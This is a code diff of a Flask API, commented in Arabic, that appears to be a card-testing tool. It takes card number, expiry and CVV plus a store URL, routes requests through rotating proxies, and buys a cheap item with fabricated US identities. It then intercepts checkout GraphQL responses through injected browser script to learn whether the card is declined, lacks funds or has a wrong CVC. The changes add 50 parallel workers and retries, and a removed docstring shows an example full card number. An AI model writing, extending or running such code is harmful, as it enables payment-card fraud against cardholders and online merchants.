@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية + بروكسيات متعددة
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية
 import time
 import re
 import json
@@ -22,8 +22,8 @@ import random
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 10
-REQUEST_TIMEOUT = 60
+MAX_WORKERS = 50
+REQUEST_TIMEOUT = 120
 TASK_QUEUE = queue.Queue()
 
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
@@ -75,127 +75,39 @@ PROXY_LIST = [
 ]
 
 def get_random_proxy():
-    """اختيار بروكسي عشوائي من القائمة"""
     return random.choice(PROXY_LIST)
 
 # ==================== نظام توليد عناوين أمريكية متطابقة ====================
 MATCHED_ADDRESSES = [
-    {
-        "first_name": "James", "last_name": "Smith", "full_name": "James Smith",
-        "address1": "1200 Main St", "city": "New York", "state": "New York", "zip": "10001",
-        "phone": "2125550101", "email_domain": "gmail.com"
-    },
-    {
-        "first_name": "Mary", "last_name": "Johnson", "full_name": "Mary Johnson",
-        "address1": "2500 Oak Ave", "city": "Los Angeles", "state": "California", "zip": "90001",
-        "phone": "2135550202", "email_domain": "yahoo.com"
-    },
-    {
-        "first_name": "Robert", "last_name": "Williams", "full_name": "Robert Williams",
-        "address1": "3800 Maple Dr", "city": "Chicago", "state": "Illinois", "zip": "60601",
-        "phone": "3125550303", "email_domain": "outlook.com"
-    },
-    {
-        "first_name": "Patricia", "last_name": "Brown", "full_name": "Patricia Brown",
-        "address1": "4500 Cedar Ln", "city": "Houston", "state": "Texas", "zip": "77001",
-        "phone": "7135550404", "email_domain": "hotmail.com"
-    },
-    {
-        "first_name": "John", "last_name": "Jones", "full_name": "John Jones",
-        "address1": "5200 Elm St", "city": "Phoenix", "state": "Arizona", "zip": "85001",
-        "phone": "6025550505", "email_domain": "protonmail.com"
-    },
-    {
-        "first_name": "Jennifer", "last_name": "Garcia", "full_name": "Jennifer Garcia",
-        "address1": "6800 Washington Ave", "city": "Philadelphia", "state": "Pennsylvania", "zip": "19101",
-        "phone": "2155550606", "email_domain": "icloud.com"
-    },
-    {
-        "first_name": "Michael", "last_name": "Miller", "full_name": "Michael Miller",
-        "address1": "7500 Park Ave", "city": "San Antonio", "state": "Texas", "zip": "78201",
-        "phone": "2105550707", "email_domain": "mail.com"
-    },
-    {
-        "first_name": "Linda", "last_name": "Davis", "full_name": "Linda Davis",
-        "address1": "8100 Lake Dr", "city": "San Diego", "state": "California", "zip": "92101",
-        "phone": "6195550808", "email_domain": "aol.com"
-    },
-    {
-        "first_name": "William", "last_name": "Rodriguez", "full_name": "William Rodriguez",
-        "address1": "9300 Hill St", "city": "Dallas", "state": "Texas", "zip": "75201",
-        "phone": "2145550909", "email_domain": "yandex.com"
-    },
-    {
-        "first_name": "Elizabeth", "last_name": "Martinez", "full_name": "Elizabeth Martinez",
-        "address1": "10400 Pine St", "city": "Austin", "state": "Texas", "zip": "73301",
-        "phone": "5125551010", "email_domain": "zoho.com"
-    },
-    {
-        "first_name": "David", "last_name": "Hernandez", "full_name": "David Hernandez",
-        "address1": "11500 Church St", "city": "Jacksonville", "state": "Florida", "zip": "32099",
-        "phone": "9045551111", "email_domain": "fastmail.com"
-    },
-    {
-        "first_name": "Barbara", "last_name": "Lopez", "full_name": "Barbara Lopez",
-        "address1": "12800 Market St", "city": "Fort Worth", "state": "Texas", "zip": "76101",
-        "phone": "8175551212", "email_domain": "tutanota.com"
-    },
-    {
-        "first_name": "Richard", "last_name": "Wilson", "full_name": "Richard Wilson",
-        "address1": "13900 Bridge St", "city": "Columbus", "state": "Ohio", "zip": "43004",
-        "phone": "6145551313", "email_domain": "gmail.com"
-    },
-    {
-        "first_name": "Susan", "last_name": "Anderson", "full_name": "Susan Anderson",
-        "address1": "15000 River Rd", "city": "Charlotte", "state": "North Carolina", "zip": "28201",
-        "phone": "7045551414", "email_domain": "yahoo.com"
-    },
-    {
-        "first_name": "Joseph", "last_name": "Thomas", "full_name": "Joseph Thomas",
-        "address1": "16200 Forest Ave", "city": "San Francisco", "state": "California", "zip": "94101",
-        "phone": "4155551515", "email_domain": "outlook.com"
-    },
-    {
-        "first_name": "Jessica", "last_name": "Taylor", "full_name": "Jessica Taylor",
-        "address1": "17500 Valley Rd", "city": "Indianapolis", "state": "Indiana", "zip": "46201",
-        "phone": "3175551616", "email_domain": "hotmail.com"
-    },
-    {
-        "first_name": "Thomas", "last_name": "Moore", "full_name": "Thomas Moore",
-        "address1": "18800 Mountain Ave", "city": "Seattle", "state": "Washington", "zip": "98101",
-        "phone": "2065551717", "email_domain": "protonmail.com"
-    },
-    {
-        "first_name": "Sarah", "last_name": "Jackson", "full_name": "Sarah Jackson",
-        "address1": "19900 Sunset Blvd", "city": "Denver", "state": "Colorado", "zip": "80201",
-        "phone": "3035551818", "email_domain": "icloud.com"
-    },
-    {
-        "first_name": "Charles", "last_name": "Martin", "full_name": "Charles Martin",
-        "address1": "21200 Highland Ave", "city": "Washington", "state": "District of Columbia", "zip": "20001",
-        "phone": "2025551919", "email_domain": "mail.com"
-    },
-    {
-        "first_name": "Karen", "last_name": "Lee", "full_name": "Karen Lee",
-        "address1": "22500 Grove St", "city": "Boston", "state": "Massachusetts", "zip": "02101",
-        "phone": "6175552020", "email_domain": "aol.com"
-    },
+    {"first_name": "James", "last_name": "Smith", "full_name": "James Smith", "address1": "1200 Main St", "city": "New York", "state": "New York", "zip": "10001", "phone": "2125550101", "email_domain": "gmail.com"},
+    {"first_name": "Mary", "last_name": "Johnson", "full_name": "Mary Johnson", "address1": "2500 Oak Ave", "city": "Los Angeles", "state": "California", "zip": "90001", "phone": "2135550202", "email_domain": "yahoo.com"},
+    {"first_name": "Robert", "last_name": "Williams", "full_name": "Robert Williams", "address1": "3800 Maple Dr", "city": "Chicago", "state": "Illinois", "zip": "60601", "phone": "3125550303", "email_domain": "outlook.com"},
+    {"first_name": "Patricia", "last_name": "Brown", "full_name": "Patricia Brown", "address1": "4500 Cedar Ln", "city": "Houston", "state": "Texas", "zip": "77001", "phone": "7135550404", "email_domain": "hotmail.com"},
+    {"first_name": "John", "last_name": "Jones", "full_name": "John Jones", "address1": "5200 Elm St", "city": "Phoenix", "state": "Arizona", "zip": "85001", "phone": "6025550505", "email_domain": "protonmail.com"},
+    {"first_name": "Jennifer", "last_name": "Garcia", "full_name": "Jennifer Garcia", "address1": "6800 Washington Ave", "city": "Philadelphia", "state": "Pennsylvania", "zip": "19101", "phone": "2155550606", "email_domain": "icloud.com"},
+    {"first_name": "Michael", "last_name": "Miller", "full_name": "Michael Miller", "address1": "7500 Park Ave", "city": "San Antonio", "state": "Texas", "zip": "78201", "phone": "2105550707", "email_domain": "mail.com"},
+    {"first_name": "Linda", "last_name": "Davis", "full_name": "Linda Davis", "address1": "8100 Lake Dr", "city": "San Diego", "state": "California", "zip": "92101", "phone": "6195550808", "email_domain": "aol.com"},
+    {"first_name": "William", "last_name": "Rodriguez", "full_name": "William Rodriguez", "address1": "9300 Hill St", "city": "Dallas", "state": "Texas", "zip": "75201", "phone": "2145550909", "email_domain": "yandex.com"},
+    {"first_name": "Elizabeth", "last_name": "Martinez", "full_name": "Elizabeth Martinez", "address1": "10400 Pine St", "city": "Austin", "state": "Texas", "zip": "73301", "phone": "5125551010", "email_domain": "zoho.com"},
+    {"first_name": "David", "last_name": "Hernandez", "full_name": "David Hernandez", "address1": "11500 Church St", "city": "Jacksonville", "state": "Florida", "zip": "32099", "phone": "9045551111", "email_domain": "fastmail.com"},
+    {"first_name": "Barbara", "last_name": "Lopez", "full_name": "Barbara Lopez", "address1": "12800 Market St", "city": "Fort Worth", "state": "Texas", "zip": "76101", "phone": "8175551212", "email_domain": "tutanota.com"},
+    {"first_name": "Richard", "last_name": "Wilson", "full_name": "Richard Wilson", "address1": "13900 Bridge St", "city": "Columbus", "state": "Ohio", "zip": "43004", "phone": "6145551313", "email_domain": "gmail.com"},
+    {"first_name": "Susan", "last_name": "Anderson", "full_name": "Susan Anderson", "address1": "15000 River Rd", "city": "Charlotte", "state": "North Carolina", "zip": "28201", "phone": "7045551414", "email_domain": "yahoo.com"},
+    {"first_name": "Joseph", "last_name": "Thomas", "full_name": "Joseph Thomas", "address1": "16200 Forest Ave", "city": "San Francisco", "state": "California", "zip": "94101", "phone": "4155551515", "email_domain": "outlook.com"},
+    {"first_name": "Jessica", "last_name": "Taylor", "full_name": "Jessica Taylor", "address1": "17500 Valley Rd", "city": "Indianapolis", "state": "Indiana", "zip": "46201", "phone": "3175551616", "email_domain": "hotmail.com"},
+    {"first_name": "Thomas", "last_name": "Moore", "full_name": "Thomas Moore", "address1": "18800 Mountain Ave", "city": "Seattle", "state": "Washington", "zip": "98101", "phone": "2065551717", "email_domain": "protonmail.com"},
+    {"first_name": "Sarah", "last_name": "Jackson", "full_name": "Sarah Jackson", "address1": "19900 Sunset Blvd", "city": "Denver", "state": "Colorado", "zip": "80201", "phone": "3035551818", "email_domain": "icloud.com"},
+    {"first_name": "Charles", "last_name": "Martin", "full_name": "Charles Martin", "address1": "21200 Highland Ave", "city": "Washington", "state": "District of Columbia", "zip": "20001", "phone": "2025551919", "email_domain": "mail.com"},
+    {"first_name": "Karen", "last_name": "Lee", "full_name": "Karen Lee", "address1": "22500 Grove St", "city": "Boston", "state": "Massachusetts", "zip": "02101", "phone": "6175552020", "email_domain": "aol.com"},
 ]
 
 def generate_matched_shipping_data():
-    """
-    توليد بيانات شحن أمريكية متطابقة بالكامل
-    """
     address = random.choice(MATCHED_ADDRESSES).copy()
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
     return address
 
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
-    """
-    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
-    """
-    
     valid_codes = []
     for code in all_codes:
         is_excluded = False
@@ -252,16 +164,7 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     return None, None
 
 def ff(ccx, site, task_id=None):
-    """
-    دالة معالجة بطاقة واحدة وموقع واحد
-    تعمل بشكل مستقل تماماً - كل استدعاء له متصفحه الخاص
     
-    ccx: رقم البطاقة|الشهر|السنة|cvv
-    site: رابط الموقع
-    task_id: معرف المهمة للتتبع
-    """
-    
-    # تسجيل بدء المهمة
     if task_id:
         with active_tasks_lock:
             active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
@@ -292,7 +195,6 @@ def ff(ccx, site, task_id=None):
     order_number = None
     payment_status = None
     
-    # اختيار بروكسي عشوائي
     random_proxy = get_random_proxy()
     logger.info(f"[{task_id}] Using proxy: {random_proxy}")
     
@@ -304,15 +206,31 @@ def ff(ccx, site, task_id=None):
         s = requests.Session()
         s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
-        digital_keywords = [
-            'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
-            'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription',
-            'service', 'guarantee', 'support'
-        ]
+        digital_keywords = ['worry-free', 'protection', 'insurance', 'warranty', 'digital', 'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription', 'service', 'guarantee', 'support']
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=190)
-        if r.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
+        # إعادة محاولة جلب المنتجات
+        max_retries = 5
+        r = None
+        for retry in range(max_retries):
+            try:
+                r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=190)
+                if r.status_code == 200:
+                    break
+                else:
+                    logger.warning(f"[{task_id}] Products fetch failed (attempt {retry+1}), status: {r.status_code}")
+                    time.sleep(random.uniform(1, 3))
+            except Exception as ex:
+                logger.warning(f"[{task_id}] Products fetch error (attempt {retry+1}): {str(ex)}")
+                time.sleep(random.uniform(1, 3))
+                if retry < max_retries - 1:
+                    random_proxy = get_random_proxy()
+                    proxy_url = f"http://{random_proxy}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
+                    s = requests.Session()
+                    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
+        
+        if r is None or r.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to fetch products after retries", "task_id": task_id}
         
         products_data = r.json()
         shippable_products = []
@@ -334,7 +252,7 @@ def ff(ccx, site, task_id=None):
             for v in p.get('variants', []):
                 price = float(v.get('price', 0))
                 available = v.get('available', True)
-                if price > 0 and available and price >= 1.0:
+                if price > 0 and available and 0.50 <= price <= 5.00:
                     shippable_products.append({
                         'title': p.get('title'),
                         'price': price,
@@ -343,17 +261,86 @@ def ff(ccx, site, task_id=None):
                     })
         
         if not shippable_products:
+            for p in products_data.get('products', []):
+                title = p.get('title', '').lower()
+                product_type = p.get('product_type', '').lower()
+                vendor = p.get('vendor', '').lower()
+                
+                is_digital = False
+                for keyword in digital_keywords:
+                    if keyword in title or keyword in product_type or keyword in vendor:
+                        is_digital = True
+                        break
+                
+                if is_digital:
+                    continue
+                
+                for v in p.get('variants', []):
+                    price = float(v.get('price', 0))
+                    available = v.get('available', True)
+                    if price > 0 and available and price >= 1.0:
+                        shippable_products.append({
+                            'title': p.get('title'),
+                            'price': price,
+                            'variant_id': v.get('id'),
+                            'handle': p.get('handle')
+                        })
+        
+        if not shippable_products:
             return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
         
-        cheapest = min(shippable_products, key=lambda x: x['price'])
-        variant_id = cheapest['variant_id']
-        total_amount = f"${cheapest['price']:.2f}"
+        selected_product = random.choice(shippable_products)
+        variant_id = selected_product['variant_id']
+        total_amount = f"${selected_product['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, timeout=100)
-        if resp.status_code != 200:
-            return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
+        # إعادة محاولة الإضافة إلى السلة
+        resp = None
+        for retry in range(max_retries):
+            try:
+                resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, timeout=100)
+                if resp.status_code == 200:
+                    logger.info(f"[{task_id}] Added to cart (attempt {retry+1})")
+                    break
+                else:
+                    logger.warning(f"[{task_id}] Add to cart failed (attempt {retry+1}), status: {resp.status_code}")
+                    time.sleep(random.uniform(1, 3))
+            except Exception as ex:
+                logger.warning(f"[{task_id}] Add to cart error (attempt {retry+1}): {str(ex)}")
+                time.sleep(random.uniform(1, 3))
+                if retry < max_retries - 1:
+                    random_proxy = get_random_proxy()
+                    proxy_url = f"http://{random_proxy}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
+                    s = requests.Session()
+                    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, timeout=100)
+        if resp is None or resp.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to add to cart after retries", "task_id": task_id}
+        
+        # إعادة محاولة checkout
+        response = None
+        for retry in range(max_retries):
+            try:
+                response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, timeout=100)
+                if response.status_code == 200:
+                    logger.info(f"[{task_id}] Checkout success (attempt {retry+1})")
+                    break
+                else:
+                    logger.warning(f"[{task_id}] Checkout failed (attempt {retry+1}), status: {response.status_code}")
+                    time.sleep(random.uniform(1, 3))
+            except Exception as ex:
+                logger.warning(f"[{task_id}] Checkout error (attempt {retry+1}): {str(ex)}")
+                time.sleep(random.uniform(1, 3))
+                if retry < max_retries - 1:
+                    random_proxy = get_random_proxy()
+                    proxy_url = f"http://{random_proxy}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
+                    s = requests.Session()
+                    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
+        
+        if response is None or response.status_code != 200:
+            return {"success": False, "code": None, "error": "Failed to get checkout after retries", "task_id": task_id}
+        
         checkout_url = response.url
         
     except Exception as e:
@@ -523,7 +510,7 @@ def ff(ccx, site, task_id=None):
         except:
             return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
         
-        # ==================== 5. اعتراض GraphQL ====================
+        # ==================== 5. اعتراض GraphQL - فقط PollForReceipt ====================
         try:
             script = """
             window.graphqlResponses = [];
@@ -559,6 +546,7 @@ def ff(ccx, site, task_id=None):
                         
                         if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                             
+                            // تجاهل Proposal تماماً
                             var isProposal = false;
                             if (requestBody) {
                                 try {
@@ -569,9 +557,11 @@ def ff(ccx, site, task_id=None):
                                 } catch(e) {}
                             }
                             
+                            // فقط إذا مو Proposal ندخله
                             if (!isProposal) {
                                 window.graphqlResponses.push(data);
                                 
+                                // تخزين PollForReceipt بشكل منفصل
                                 if (requestBody) {
                                     try {
                                         var parsedBody2 = JSON.parse(requestBody);
@@ -616,6 +606,7 @@ def ff(ccx, site, task_id=None):
                         
                         if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                             
+                            // تجاهل Proposal تماماً
                             var isProposal = false;
                             if (requestBody) {
                                 try {
@@ -626,9 +617,11 @@ def ff(ccx, site, task_id=None):
                                 } catch(e) {}
                             }
                             
+                            // فقط إذا مو Proposal ندخله
                             if (!isProposal) {
                                 window.graphqlResponses.push(data);
                                 
+                                // تخزين PollForReceipt بشكل منفصل
                                 if (requestBody) {
                                     try {
                                         var parsedBody2 = JSON.parse(requestBody);
@@ -692,7 +685,7 @@ def ff(ccx, site, task_id=None):
                     }
                 """)
             
-            # ==================== 7. استخراج الكود ====================
+            # ==================== 7. استخراج الكود - فقط من PollForReceipt ====================
             found_code = None
             found_typename = None
             all_codes = []
@@ -730,15 +723,14 @@ def ff(ccx, site, task_id=None):
                 'AddressLocalizationKeys'
             ]
             
-            for attempt in range(10):
+            for attempt in range(12):
                 time.sleep(1.5)
                 
+                # الأولوية لـ PollForReceipt
                 poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
                 graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
                 current_url = driver.current_url
                 final_url = current_url
-                
-                page_urls = driver.execute_script("return window.pageUrls || [];")
                 
                 if '/thank_you' in current_url:
                     order_confirmed = True
@@ -782,6 +774,7 @@ def ff(ccx, site, task_id=None):
                 except:
                     pass
                 
+                # استخراج من PollForReceipt فقط
                 for resp in poll_responses:
                     body = resp.get('body', '')
                     url = resp.get('url', '')
@@ -856,118 +849,60 @@ def ff(ccx, site, task_id=None):
                                         response_result = message
                         except:
                             pass
-                
-                for resp in graphql_responses:
-                    body = resp.get('body', '')
-                    url = resp.get('url', '')
                     
-                    if not body:
-                        continue
-                    
-                    if '/thank_you' in body or 'thank_you' in url:
+                    if '/thank_you' in body.lower() or 'order confirmed' in body.lower() or 'thank you for your order' in body.lower():
                         order_confirmed = True
                         found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
                         break
                     
-                    if f"{base_url}/thank_you" in body or f"{base_url}/post_purchase" in body:
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
+                    if 'CompletePaymentChallenge' in body:
+                        is_3ds = True
+                        found_code = '3DS_REQUIRED'
+                        found_typename = 'CompletePaymentChallenge'
                         break
                     
-                    if 'Your order is confirmed' in body or 'Order confirmed' in body or 'order confirmed' in body.lower():
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                        if order_match:
-                            order_number = order_match.group(1)
-                        break
-                    
-                    if 'Thank you for your order' in body or 'thank you for your order' in body.lower():
-                        order_confirmed = True
-                        found_code = 'ORDER_CONFIRMED'
-                        response_result = 'Order confirmed - Thank you for your purchase!'
-                        order_match = re.search(r'Order #?([A-Z0-9]+)', body, re.IGNORECASE)
-                        if order_match:
-                            order_number = order_match.group(1)
-                        break
-                    
-                    if '/persisted' in url and 'CompletePaymentChallenge' in body:
-                        try:
-                            data = json.loads(body)
-                            if 'data' in data and 'receipt' in data['data']:
-                                receipt = data['data']['receipt']
-                                if 'action' in receipt:
-                                    action = receipt['action']
-                                    if action.get('__typename') == 'CompletePaymentChallenge':
-                                        is_3ds = True
-                                        found_code = '3DS_REQUIRED'
-                                        found_typename = 'CompletePaymentChallenge'
-                                        response_result = '3DS Secure required - Please complete authentication'
-                                        break
-                        except:
-                            pass
-                    
-                    if not all_codes:
-                        pattern = r'"code"\s*:\s*"([^"]+)"'
-                        matches = re.findall(pattern, body, re.IGNORECASE)
-                        for code in matches:
-                            if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                                is_excluded = False
-                                for excluded in excluded_codes:
-                                    if excluded in code:
-                                        is_excluded = True
-                                        break
-                                if not is_excluded and code not in all_codes:
-                                    all_codes.append(code)
-                    
-                    if not all_typenames:
-                        if '__typename' in body:
-                            pattern = r'"__typename"\s*:\s*"([^"]+)"'
-                            matches = re.findall(pattern, body, re.IGNORECASE)
-                            for typename in matches:
-                                if len(typename) > 3 and len(typename) < 80:
-                                    if typename not in ['Query', 'Mutation', 'Subscription']:
-                                        if typename not in all_typenames:
-                                            all_typenames.append(typename)
-                    
-                    pattern = r'"status"\s*:\s*"([^"]+)"'
-                    matches = re.findall(pattern, body, re.IGNORECASE)
-                    for status in matches:
-                        if len(status) > 3 and len(status) < 80 and ' ' not in status:
-                            is_excluded = False
-                            for excluded in excluded_codes:
-                                if excluded in status:
-                                    is_excluded = True
-                                    break
-                            if not is_excluded and status not in all_codes:
-                                all_codes.append(status)
-                    
-                    if '/authentications/' in body or 'AUTHORIZATION_ERROR' in body:
-                        if '3DS_REQUIRED' not in all_codes:
-                            all_codes.append('3DS_REQUIRED')
-                            response_result = '3DS Secure required'
-                    
-                    if 'INCORRECT_ZIP' in body:
-                        if 'INCORRECT_ZIP' not in all_codes:
-                            all_codes.append('INCORRECT_ZIP')
-                            response_result = 'Incorrect ZIP'
-                    if 'INSUFFICIENT_FUNDS' in body:
-                        if 'INSUFFICIENT_FUNDS' not in all_codes:
-                            all_codes.append('INSUFFICIENT_FUNDS')
-                            response_result = 'Insufficient funds'
-                    if 'INCORRECT_CVC' in body:
-                        if 'INCORRECT_CVC' not in all_codes:
-                            all_codes.append('INCORRECT_CVC')
-                            response_result = 'INCORRECT_CVC'
+                    body_upper = body.upper()
+                    if 'INCORRECT_ZIP' in body_upper and 'INCORRECT_ZIP' not in all_codes:
+                        all_codes.append('INCORRECT_ZIP')
+                    if 'INSUFFICIENT_FUNDS' in body_upper and 'INSUFFICIENT_FUNDS' not in all_codes:
+                        all_codes.append('INSUFFICIENT_FUNDS')
+                    if 'INCORRECT_CVC' in body_upper and 'INCORRECT_CVC' not in all_codes:
+                        all_codes.append('INCORRECT_CVC')
+                    if 'CARD_DECLINED' in body_upper and 'CARD_DECLINED' not in all_codes:
+                        all_codes.append('CARD_DECLINED')
+                    if 'FRAUD' in body_upper and 'FRAUD_SUSPECTED' not in all_codes:
+                        all_codes.append('FRAUD_SUSPECTED')
                 
                 if found_code or order_confirmed:
                     break
                 
+                # إذا ماكو شي من PollForReceipt، نرجع لـ graphqlResponses (بدون Proposal)
+                if not all_codes and not all_typenames:
+                    for resp in graphql_responses:
+                        body = resp.get('body', '')
+                        url = resp.get('url', '')
+                        
+                        if not body:
+                            continue
+                        
+                        if '/thank_you' in body.lower() or 'order confirmed' in body.lower():
+                            order_confirmed = True
+                            found_code = 'ORDER_CONFIRMED'
+                            break
+                        
+                        pattern = r'"code"\s*:\s*"([^"]+)"'
+                        for code in re.findall(pattern, body, re.IGNORECASE):
+                            if len(code) > 3 and len(code) < 80 and ' ' not in code and code not in all_codes:
+                                all_codes.append(code)
+                        
+                        if '__typename' in body:
+                            for typename in re.findall(r'"__typename"\s*:\s*"([^"]+)"', body, re.IGNORECASE):
+                                if typename not in ['Query', 'Mutation', 'Subscription'] and typename not in all_typenames:
+                                    all_typenames.append(typename)
+                
                 final_url = driver.current_url
             
+            # Performance logs كملاذ أخير
             if not found_code and not all_codes and not order_confirmed:
                 logs = driver.get_log('performance')
                 for log in logs:
@@ -993,14 +928,11 @@ def ff(ccx, site, task_id=None):
                                                                 is_3ds = True
                                                                 found_code = '3DS_REQUIRED'
                                                                 found_typename = 'CompletePaymentChallenge'
-                                                                response_result = '3DS Secure required - Please complete authentication'
                                                                 break
                                                 except:
                                                     pass
                                             if not found_code:
-                                                pattern = r'"code"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for code in matches:
+                                                for code in re.findall(r'"code"\s*:\s*"([^"]+)"', body, re.IGNORECASE):
                                                     if len(code) > 3 and len(code) < 80 and ' ' not in code:
                                                         is_excluded = False
                                                         for excluded in excluded_codes:
@@ -1010,9 +942,7 @@ def ff(ccx, site, task_id=None):
                                                         if not is_excluded and code not in all_codes:
                                                             all_codes.append(code)
                                             if '__typename' in body:
-                                                pattern = r'"__typename"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for typename in matches:
+                                                for typename in re.findall(r'"__typename"\s*:\s*"([^"]+)"', body, re.IGNORECASE):
                                                     if len(typename) > 3 and len(typename) < 80:
                                                         if typename not in ['Query', 'Mutation', 'Subscription']:
                                                             if typename not in all_typenames:
@@ -1055,6 +985,9 @@ def ff(ccx, site, task_id=None):
                 if extracted_code:
                     result_code = extracted_code
                     result_typename = extracted_typename if extracted_typename else found_typename
+                elif all_codes:
+                    result_code = all_codes[0]
+                    result_typename = all_typenames[0] if all_typenames else None
                 elif all_typenames:
                     result_code = all_typenames[0]
                     result_typename = all_typenames[0]
@@ -1144,15 +1077,6 @@ def ff(ccx, site, task_id=None):
 # ==================== Routes ====================
 @app.route('/', methods=['GET'])
 def home():
-    """
-    نقطة النهاية الرئيسية
-    
-    الاستخدام:
-    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
-    
-    مثال:
-    /?cc=4918460118934875|08|2027|293&url=https://www.example.com
-    """
     cc = request.args.get('cc')
     url = request.args.get('url')
     
@@ -1164,7 +1088,6 @@ def home():
         })
     
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
-    
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1180,9 +1103,6 @@ def home():
 
 @app.route('/status', methods=['GET'])
 def status():
-    """
-    معرفة حالة جميع المهام النشطة
-    """
     with active_tasks_lock:
         return jsonify({
             "active_tasks_count": len(active_tasks),
